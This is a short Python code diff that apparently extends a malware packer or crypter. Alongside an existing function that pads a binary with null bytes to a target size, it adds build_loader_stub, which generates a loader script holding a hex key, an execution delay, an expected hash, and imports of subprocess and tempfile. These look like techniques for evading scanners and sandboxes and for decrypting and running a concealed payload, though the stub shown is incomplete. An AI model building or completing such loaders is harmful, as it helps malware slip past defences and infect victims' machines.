@@ -36,3 +36,15 @@ def pad_binary(data: bytes, target_mb: int) -> bytes:
 
     padding = b"\x00" * (target_bytes - current_size)
     return data + padding
+
+def build_loader_stub(key: bytes, delay: int, original_hash: str) -> str:
+    key_hex = key.hex()
+
+    stub = f"""
+import time, os, sys, hashlib, tempfile, subprocess
+
+KEY = bytes.fromhex("{key_hex}")
+DELAY = {delay}
+EXPECTED_HASH = "{original_hash}"
+"""
+    return stub
